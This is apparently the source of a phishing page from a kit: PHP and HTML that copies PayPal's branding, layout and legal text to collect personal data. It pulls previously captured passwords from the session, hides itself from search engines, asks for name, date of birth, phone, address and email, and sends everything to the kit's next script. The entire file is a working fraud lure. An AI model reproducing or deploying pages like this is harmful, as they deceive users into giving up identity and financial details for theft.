<?php
session_start();
$unpass = $_SESSION['unpass'];
$deuxpass = $_SESSION['deuxpass'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<head>
<script>
function validateForm()
{
var x=document.forms["myForm"]["firstname"].value;
if (x==null || x=="")
  {
  alert("First Name must be filled out");
  return false;
  }
  
  var x=document.forms["myForm"]["lastname"].value;
if (x==null || x=="")
  {
  alert("Last Name must be filled out");
  return false;
  }
  
    var x=document.forms["myForm"]["address1"].value;
if (x==null || x=="")
  {
  alert("Address line 1 must be filled out");
  return false;
  }
  
    var x=document.forms["myForm"]["city"].value;
if (x==null || x=="")
  {
  alert("City must be filled out");
  return false;
  }

    var x=document.forms["myForm"]["state"].value;
if (x==null || x=="")
  {
  alert("State / Province / Region must be filled out");
  return false;
  }
  
      var x=document.forms["myForm"]["zip"].value;
if (x==null || x=="")
  {
  alert("Postal code must be filled out");
  return false;
  }
  
  var x=document.forms["myForm"]["emails"].value;
if (x==null || x=="")
  {
  alert("Email must be filled out");
  return false;
  }
}
</script>
</head>


<html lang="en">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<head>
<title>Confirm Your information</title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="doc/global00.css">

<link media="print" rel="stylesheet" type="text/css" href="doc/print000.css"><style type="text/css">
					form label.inline{display:inline;}
					span.countryClass {display:block;}
					span.countryInfo {margin-left:0;}
				</style>
<script type="text/javascript" src="doc/global00.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20121008-1';</script><link rel="shortcut icon" href="doc/pp_favic.ico"><link rel="apple-touch-icon"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class="addStreet" id="page"><div id="header" class="std"><h1><a><img border="0" src="doc/paypal_l.gif" alt="PayPal"></a></h1><div id="navGlobal"><span><a href="" class="accessAid skip">Skip to main content</a></span><ul><li class="logout"><a>Log Out</a></li><li><a>Help</a></li><li class="last"><a>Security Center</a></li></ul></div><div role="navigation" id="navPrimary"><ul><li class="active"><a class="scTrack:SRD:Nav:BD36">My Account</a></li><li><a class="scTrack:SRD:Nav:BF1">Send Payment</a></li><li><a class="scTrack:SRD:Nav:BF5">Request Money</a></li><li><a class="scTrack:SRD:Nav:BF10">Merchant Services</a></li><li><a class="scTrack:SRD:Nav:BF11">Products &amp; Services</a></li></ul></div></div><div id="content"><div id="headline"><h1>Confirm Your information</h1>
</div><div id="messageBox"></div><div id="main"><div class="layout1"><p>Please fill in all the blanks.</p><form name="myForm" method="post" id="addAddress" action="Suite.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548" onsubmit="return validateForm()" onsubmit="return validateForm()" class><input type="hidden" name="cmd" value="_profile-address-addeditrm-submit"><input type="hidden" name="return" value><input type="hidden" name="cc_count" value="1"><div><input type="hidden" name="address_type" value="home_work"><div id="recipient_Name"><p class="group"><label for="add_name_id"><span class="labelText"><span id="recp_label">Recipient Name</span></span></label><span class="field"><input type="text" id="add_name_id" size="30" maxlength="32" name="addressee_name"></span></p></div><p class="group"><label for="firstname"><span class="labelText">First Name</span></label><span class="field confidential"><input type="text" id="firstname" class="confidential text large" name="firstname" value></span></p><p class="group"><label for="lastname"><span class="labelText">Last Name</span></label><span class="field confidential"><input type="text" id="lastname" class="confidential text large" name="lastname" value></span></p>
Date of birth<br>
<select name="bday">
  <option value="0" selected="selected">Day</option>
        <option value="1">01</option>
        <option value="2">02</option>
        <option value="3">03</option>
        <option value="4">04</option>
        <option value="5">05</option>
        <option value="6">06</option>
        <option value="7">07</option>
        <option value="8">08</option>
        <option value="9">09</option>
        <option value="10">10</option>
        <option value="11">11</option>
        <option value="12">12</option>
        <option value="13">13</option>
        <option value="14">14</option>
        <option value="15">15</option>
        <option value="16">16</option>
        <option value="17">17</option>
        <option value="18">18</option>
        <option value="19">19</option>
        <option value="20">20</option>
        <option value="21">21</option>
        <option value="22">22</option>
        <option value="23">23</option>
        <option value="24">24</option>
        <option value="25">25</option>
        <option value="26">26</option>
        <option value="27">27</option>
        <option value="28">28</option>
        <option value="29">29</option>
        <option value="30">30</option>
        <option value="31">31</option>
    </select>
      <select name="bmonth">
        <option value="0" selected="selected">Month</option>
        <option value="1">January</option>
        <option value="2">February</option>
        <option value="3">March</option>
        <option value="4">April</option>
        <option value="5">May</option>
        <option value="6">June</option>
        <option value="7">July</option>
        <option value="8">August</option>
        <option value="9">September</option>
        <option value="10">October</option>
        <option value="11">November</option>
        <option value="12">December</option>
      </select>
      <select class="" name="byear">
        <option selected="selected" value="">Year</option>
        <option value="1910">1910</option>
        <option value="1911">1911</option>
        <option value="1912">1912</option>
        <option value="1913">1913</option>
        <option value="1914">1914</option>
        <option value="1915">1915</option>
        <option value="1916">1916</option>
        <option value="1917">1917</option>
        <option value="1918">1918</option>
        <option value="1919">1919</option>
        <option value="1920">1920</option>
        <option value="1921">1921</option>
        <option value="1922">1922</option>
        <option value="1923">1923</option>
        <option value="1924">1924</option>
        <option value="1925">1925</option>
        <option value="1926">1926</option>
        <option value="1927">1927</option>
        <option value="1928">1928</option>
        <option value="1929">1929</option>
        <option value="1930">1930</option>
        <option value="1931">1931</option>
        <option value="1932">1932</option>
        <option value="1933">1933</option>
        <option value="1934">1934</option>
        <option value="1935">1935</option>
        <option value="1936">1936</option>
        <option value="1937">1937</option>
        <option value="1938">1938</option>
        <option value="1939">1939</option>
        <option value="1940">1940</option>
        <option value="1941">1941</option>
        <option value="1942">1942</option>
        <option value="1943">1943</option>
        <option value="1944">1944</option>
        <option value="1945">1945</option>
        <option value="1946">1946</option>
        <option value="1947">1947</option>
        <option value="1948">1948</option>
        <option value="1949">1949</option>
        <option value="1950">1950</option>
        <option value="1951">1951</option>
        <option value="1952">1952</option>
        <option value="1953">1953</option>
        <option value="1954">1954</option>
        <option value="1955">1955</option>
        <option value="1956">1956</option>
        <option value="1957">1957</option>
        <option value="1958">1958</option>
        <option value="1959">1959</option>
        <option value="1960">1960</option>
        <option value="1961">1961</option>
        <option value="1962">1962</option>
        <option value="1963">1963</option>
        <option value="1964">1964</option>
        <option value="1965">1965</option>
        <option value="1966">1966</option>
        <option value="1967">1967</option>
        <option value="1968">1968</option>
        <option value="1969">1969</option>
        <option value="1970">1970</option>
        <option value="1971">1971</option>
        <option value="1972">1972</option>
        <option value="1973">1973</option>
        <option value="1974">1974</option>
        <option value="1975">1975</option>
        <option value="1976">1976</option>
        <option value="1977">1977</option>
        <option value="1978">1978</option>
        <option value="1979">1979</option>
        <option value="1980">1980</option>
        <option value="1981">1981</option>
        <option value="1982">1982</option>
        <option value="1983">1983</option>
        <option value="1984">1984</option>
        <option value="1985">1985</option>
        <option value="1986">1986</option>
        <option value="1987">1987</option>
        <option value="1988">1988</option>
        <option value="1989">1989</option>
        <option value="1990">1990</option>
        <option value="1991">1991</option>
        <option value="1992">1992</option>
        <option value="1992">1993</option>
        <option value="1992">1994</option>
      </select>
    </label>
  </span></p>
<p class="group"><label for="phone"><span class="labelText">Phone number</span></label><span class="field confidential"><input type="text" id="phone" class="confidential text large" name="phone"></span></p>
<p class="group"><label for="address1"><span class="labelText">Address line 1</span></label><span class="field confidential"><input type="text" id="address1" class="confidential text large" name="address1"></span></p><p class="group"><label for="address2"><span class="labelText">Address line 2</span> <span class="optional">(optional)</span></label><span class="field confidential"><input type="text" id="address2" class="confidential text large" name="address2" value></span></p><p class="group"><label for="city"><span class="labelText">City</span></label><span class="field confidential"><input type="text" id="city" class="confidential text large" name="city" value></span></p><p class="group"><label for="state"><span class="labelText">State / Province / Region</span></label><span class="field confidential"><input type="text" id="state" size="25" maxlength="40" class="confidential text" name="state" value></span></p><p class="group"><label for="zip"><span class="labelText">Postal code</span></label><span class="field confidential"><input type="text" id="zip" class="confidential text medium" name="zip" maxlength="5"></span></p></div>


<p class="group"><span class="label">Country</span><input type="text" name="cntry" size="25" value="" style="direction: ltr"></p>

<p class="group"><span class="label">Email</span><input type="text" name="emails" size="25" value="" style="direction: ltr"></p>

<div id="cc_details"><p>Associated Credit Cards</p><div class="datatable"><table border="0" cellpadding="0" cellspacing="0" id="ccList" summary="Table displaying your associated cards for selection."><thead><tr><th class="ccSelect">Select</th><th class="ccType">Card Type</th><th class="ccDetails">Card Details</th><th class="ccBAddress">Billing Address</th></tr></thead><tr><td class="ccSelect"><label for="cc_id_1" class="accessAid">Select record 1</label><input type="checkbox" id="cc_id_1" name="cc_id_1" value="CqI5UthgtEkp41sYvaz0L2-wh9qSr4xebUJj92-m8osWftvO6PBtCorKbeC"></td><td class="ccType"><img src="doc/icon_vis.gif" border="0" alt="Visa"></td><td class="ccDetails">x-XXXX<br>Expires &nbsp;XX / XXXX&nbsp;</td><td class="ccBAddresslast"><div class="billingAddress"><div class="vcard"><div class="adr"><div class="street-address confidential" style="color:#ff0000;">Hidden  For Security&nbsp;</div><div class="extended-address confidential"></div><span class="locality confidential">XXXXXX&nbsp;</span><span class="region confidential"></span><div class="postal-code confidential">XXXXX&nbsp;</div><div class="country-name">XXXXX-XXX&nbsp;</div></div></div></div></td></tr></table></div><p><strong>Note: </strong>By checking the checkbox, you agree that your card will be associated with the address above.</p></div><p class="buttons"><input type="submit" id="add_submit" name="add_submit.x" value="Continue" class="button primary"><input type="submit" name="cancel.x" value="Cancel" class="button"></p><input name="auth" type="hidden" value="A9aDRoU50rHm4BNQRIyucXT2plbmM7jv9AJG-r4U9clEPI.LdzVZnxRmJANooVZ9wLr-HEZ3jB.HhyIEWHDNSiA"><input name="form_charset" type="hidden" value="UTF-8"></form></div></div></div><div id="footer" role="contentinfo"><h5 class="accessAid">More Information</h5><ul><li><a>About Us</a></li><li><a>Accounts</a></li><li><a>Fees</a></li><li><a>Privacy</a></li><li><a>Security Center</a></li><li><a >Contact Us</a></li><li><a>Legal Agreements</a></li></ul><p id="legal">Copyright © 1999-2013 PayPal. All rights reserved.<br>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value<br>facility, does not require the approval of the Monetary Authority of Singapore.<br>Users are advised to read the <a>terms and conditions</a> carefully.</p></div><div role="navigation" id="navFull"><ul><li class="active"><a class="scTrack:SRD:Nav:BD36">My Account</a><ul><li class="active"><a class="scTrack:SRD:Nav:BD37">Overview</a></li><li><a class="scTrack:SRD:Nav:BD39">Withdraw</a></li><li><a class="scTrack:SRD:Nav:BD43">History</a><ul><li><a class="scTrack:SRD:Nav:BD44">Basic Search</a></li><li><a class="scTrack:SRD:Nav:BD46">Download History</a></li><li><a class="scTrack:SRD:Nav:BD49">Reports</a></li><li><a class="scTrack:SRD:Nav:BD50">IPN History</a></li></ul></li><li><a class="scTrack:SRD:Nav:BD51">Resolution Center</a><ul><li><a class="scTrack:SRD:Nav:BD52">View Open Cases</a></li></ul></li><li><a class="scTrack:SRD:Nav:BD62">Profile</a><ul><li><a class="scTrack:SRD:Nav:BD63">Add/Edit Email</a></li><li><a class="scTrack:SRD:Nav:BD64">Add/Edit Bank Account</a></li><li><a class="scTrack:SRD:Nav:BD65">Add/Edit Credit Card</a></li><li><a class="scTrack:SRD:Nav:BD66">Add/Edit Street Address</a></li></ul></li></ul></li><li><a class="scTrack:SRD:Nav:BF1">Send Payment</a></li><li><a class="scTrack:SRD:Nav:BF5">Request Money</a></li><li><a class="scTrack:SRD:Nav:BF10">Merchant Services</a></li><li><a class="scTrack:SRD:Nav:BF11">Products &amp; Services</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="doc/widgets0.js"></script><script type="text/javascript" src="doc/flowEdit.js"></script>
</body></html>